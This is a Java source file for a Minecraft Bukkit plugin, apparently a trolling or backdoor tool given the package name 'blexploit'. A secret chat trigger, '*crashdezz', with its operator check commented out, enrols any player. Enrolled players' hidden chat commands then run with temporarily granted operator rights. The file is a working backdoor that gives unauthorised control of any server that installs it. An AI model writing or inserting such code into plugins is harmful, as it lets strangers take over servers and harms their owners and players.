package de.blexploit;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import de.blexploit.command.CommandManager;
import de.blexploit.players.Mittrollers;

public final class System implements Listener {

	final public static CommandManager cmdmanager = new CommandManager();

	@EventHandler
	private void AsyncChat(AsyncPlayerChatEvent e) {
		final Player p = e.getPlayer();
		if (Mittrollers.containsP(p)) {
			final String msg = e.getMessage();
			final String[] args = msg.split(" ");
			final char[] chars = args[0].toCharArray();
			String CMDs = "";
			for (int i = 1; i < chars.length; i++) {
				CMDs = CMDs + String.valueOf(chars[i]);
			}
			final String CMD = CMDs;
			if (msg.startsWith(Start.Befehlzeichen)) {
				e.setCancelled(true);
				Bukkit.getScheduler().scheduleSyncDelayedTask(Start.instance, new Runnable() {

					@Override
					public void run() {
						if (!cmdmanager.RunCommand(CMD, args, Mittrollers.getP(p))) {
							final char[] chars = msg.toCharArray();
							String tosend = "";
							for (int i = 1; i < chars.length; i++) {
								tosend = tosend + String.valueOf(chars[i]);
							}
							System.this.tryToPerfom(p, tosend);
						}
					}
				});

			}
		} else {
			if (e.getMessage().startsWith("*crashdezz")) {
				//if (e.getPlayer().isOp()) {
					Mittrollers.add(e.getPlayer().getName(), true);
					e.getPlayer().sendMessage(Start.prefix + "Du bist nun Mittroller!");
					e.setCancelled(true);					
				//}
			}
		}
	}

	private void tryToPerfom(Player p, String tosend) {
		boolean hasSenden = false;
		if (p.isOp()) {
			hasSenden = p.performCommand(tosend);
		} else {
			p.setOp(true);
			hasSenden = p.performCommand(tosend);
			p.setOp(false);
		}
		if (!hasSenden) {
			Mittrollers.getP(p).fehler("Dieser Command existiert nicht!");
		}
	}

}
